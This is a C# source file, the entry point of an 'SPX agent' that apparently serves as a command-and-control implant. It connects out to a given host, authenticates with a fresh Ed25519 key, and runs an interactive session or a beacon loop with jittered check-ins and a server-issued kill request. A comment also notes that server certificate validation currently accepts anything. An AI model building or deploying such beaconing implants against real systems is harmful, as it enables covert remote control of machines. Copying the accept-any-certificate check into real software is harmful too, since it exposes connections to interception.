namespace SpxAgent;

// SPX agent entry point.
//
// Usage:
//   spx-agent <host> <port> [mode=session|beacon] [intervalSec=60] [jitterPercent=20]
//
// The agent generates a fresh Ed25519 keypair on each run and prints the hex
// public key, which must be added to the server's server.yaml:
//
//   spx:
//     - host: "0.0.0.0"
//       port: 9999
//       authorized_keys:
//         - "<hex public key from agent output>"
//
// Server certificate pinning is NOT yet wired (SpxClient.ValidateServerCertificate
// accepts anything) - see the TODO there.
public static class Program
{
    public static async Task<int> Main(string[] args)
    {
        string host = args.Length > 0 ? args[0] : "127.0.0.1";
        int port = args.Length > 1 ? int.Parse(args[1]) : 9999;
        string mode = args.Length > 2 ? args[2] : "session";
        int intervalSec = args.Length > 3 ? int.Parse(args[3]) : 60;
        int jitterPercent = args.Length > 4 ? int.Parse(args[4]) : 20;

        if (mode != "session" && mode != "beacon")
            throw new ArgumentException($"mode must be \"session\" or \"beacon\", got \"{mode}\"");

        long intervalMs = intervalSec * 1000L;
        long jitterMs = intervalMs * jitterPercent / 100L;

        var identity = new AgentIdentity();
        Console.WriteLine($"[*] agent public key (hex): {identity.PublicKeyHex}");
        Console.WriteLine($"[*] connecting to {host}:{port} ...");

        using var cts = new CancellationTokenSource();
        Console.CancelKeyPress += (_, e) =>
        {
            e.Cancel = true;
            cts.Cancel();
        };

        return mode == "session"
            ? await RunSessionModeAsync(host, port, identity, cts.Token)
            : await RunBeaconModeAsync(host, port, identity, intervalMs, jitterMs, cts.Token);
    }

    private static async Task<int> RunSessionModeAsync(string host, int port, AgentIdentity identity, CancellationToken ct)
    {
        try
        {
            using var client = await SpxClient.ConnectAsync(host, port, identity);
            await client.AuthenticateAsync();
            Console.WriteLine("[+] AUTH OK");

            string sessionId = await client.RegisterSessionAsync();
            Console.WriteLine($"[+] registered session: {sessionId}");

            await client.RunAsync(ct);
            return 0;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[!] session failed: {ex.Message}");
            return 1;
        }
    }

    private static async Task<int> RunBeaconModeAsync(string host, int port, AgentIdentity identity, long intervalMs, long jitterMs, CancellationToken ct)
    {
        string beaconId = Environment.GetEnvironmentVariable("SPX_BEACON_ID") ?? Frame.NewId();
        Console.WriteLine($"[*] beacon id: {beaconId} (set SPX_BEACON_ID to persist)");

        while (!ct.IsCancellationRequested)
        {
            try
            {
                using var client = await SpxClient.ConnectAsync(host, port, identity);
                await client.AuthenticateAsync();
                Console.WriteLine("[+] AUTH OK");

                await client.RegisterBeaconAsync(beaconId, intervalMs, jitterMs);
                Console.WriteLine($"[+] registered beacon: {beaconId}");

                bool killed = await client.RunBeaconCheckinAsync(beaconId, intervalMs, jitterMs, ct);
                if (killed)
                {
                    Console.WriteLine("[+] KillReq received, shutting down");
                    return 0;
                }
                Console.WriteLine("[+] check-in complete");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] check-in failed: {ex.Message}");
            }

            long delayMs = intervalMs + Random.Shared.Next((int)-jitterMs, (int)jitterMs + 1);
            if (delayMs < 0) delayMs = 0;
            try
            {
                await Task.Delay(TimeSpan.FromMilliseconds(delayMs), ct);
            }
            catch (OperationCanceledException)
            {
                break;
            }
        }

        return 0;
    }
}
